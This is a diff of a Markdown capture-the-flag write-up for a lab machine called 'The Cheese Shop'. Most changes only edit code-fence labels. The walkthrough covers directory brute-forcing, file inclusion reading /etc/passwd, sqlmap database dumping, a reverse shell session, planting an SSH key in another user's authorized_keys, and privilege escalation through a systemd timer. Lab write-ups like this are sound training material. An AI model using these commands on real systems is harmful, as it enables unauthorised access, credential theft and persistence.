@@ -18,9 +18,8 @@ There are multipĺe ports using HTTP protocol, I recomend testing them one by on
 
 ## Pasive recognition
 
-```bash
+```
 whatweb 10.113.168.252
-
 ERROR Opening: https://10.113.168.252 - SSL_connect returned=1 errno=0 peeraddr=10.113.168.252:443 state=SSLv3/TLS write client hello: wrong version number
 http://10.113.168.252 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[info@thecheeseshop.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.113.168.252], Script, Title[The Cheese Shop]
 ```
@@ -33,7 +32,7 @@ We're looking at an Apache server. Let's explore its website a bit further and u
 
 On the home page, we can see several sections; the most interesting one might be the login, but without credentials, we can't do anything yet. Let's run `gobuster` to see what we find:
 
-```bash
+```
 gobuster dir -u http://cheese.thm -w /usr/share/wordlists/dirb/common.txt -t 100 -q -r -x txt,php,html,css,js --xl 275
 
   adminpanel.css       (Status: 200) [Size: 562]
@@ -62,13 +61,13 @@ Since we can manipulate the URL, the first thing I do is search for `/etc/passwd
 
 Let's download this file to out machine:
 
-```bash
+```
 wget http://cheese.thm/secret-script.php?file=php://filter/resource=/etc/passwd
 ```
 
 The first thing I do is check who users are so we know who we're looking for:
 
-```bash
+```
 grep "bash" etc-pwd.txt
 
   root:x:0:0:root:/root:/bin/bash
@@ -90,7 +89,7 @@ We should save this request to a file on our machine, which we will use later.
 
 Great, at this point I tried some SQL Injection but it didn't work, so I did some reading and found out that we can use `sqlmap` to break into the database:
 
-```bash
+```
 sqlmap -r login-form.txt --batch --dbs
 ```
 
@@ -98,7 +97,7 @@ sqlmap -r login-form.txt --batch --dbs
 
 Then, we execute:
 
-```bash
+```
 sqlmap -r login-form.txt --batch -D users --tables
 ```
 
@@ -106,7 +105,7 @@ sqlmap -r login-form.txt --batch -D users --tables
 
 Finally:
 
-```bash
+```
 sqlmap -r login-form.txt --batch -D users -T users --dump
 ```
 
@@ -114,7 +113,7 @@ sqlmap -r login-form.txt --batch -D users -T users --dump
 
 Great, we have the credentials. Let's see what this password is, since it look like a hash:
 
-```bash
+```
 echo "5b0c2e1b4fe1410e47f26feff7f4fc4c" | hashid
 
   Analyzing '5b0c2e1b4fe1410e47f26feff7f4fc4c'
@@ -207,7 +206,7 @@ At first, I ran into issues with the reverse shell, so to avoid any problems, I 
 
 NOTE: To obtain reverse shells, go to https://www.revshells.com/
 
-```bash
+```
 www-data@ip-10-114-134-16:/var/www/html$ whoami
 whoami
 www-data
@@ -233,13 +232,13 @@ This is incredible! The `.ssh` directory for the user **comte** has very permiss
 
 Then we copy the `.pub` file and add it to comte's `autorized-keys`:
 
-```bash
+```
 www-data@ip-10-114-134-16:/home/comte/.ssh$ echo "ssh-ed25519 AAAA..." >> authorized_keys
 ```
 
 And we log in via port 22 using our key:
 
-```bash
+```
 ssh -i ctf_key comte@<ip>
 ```
 
@@ -262,7 +261,7 @@ The firts thing I do is check gto bins: https://gtfobins.org/
 
 There's nothing that can help. I also checked the `cronjobs` and nothing is running. so I looked into what we could run with privileges:
 
-```bash
+```
 find / -perm -4000 2>/dev/null
 ```
 
@@ -272,7 +271,7 @@ Perfect, we know what we can do. The big problem with this one it that it will a
 
 The first thing that comes to mind is to look up what "exploit.timer" is:
 
-```bash
+```
 comte@ip-10-114-134-16:/$ find / -name exploit.timer 2>/dev/null
 /etc/systemd/system/exploit.timer
 ```
@@ -283,7 +282,7 @@ We went there and found the following:
 
 So this service copies the `xxd` binary to `/opt` and sets it to have superuser permissions. Let's run all the commands listed here in order to reload the daemons, start the service and run it:
 
-```bash
+```
 comte@ip-10-114-134-16:/etc/systemd/system$ sudo /bin/systemctl daemon-reload 
 comte@ip-10-114-134-16:/etc/systemd/system$ sudo /bin/systemctl enable exploit.timer
 comte@ip-10-114-134-16:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
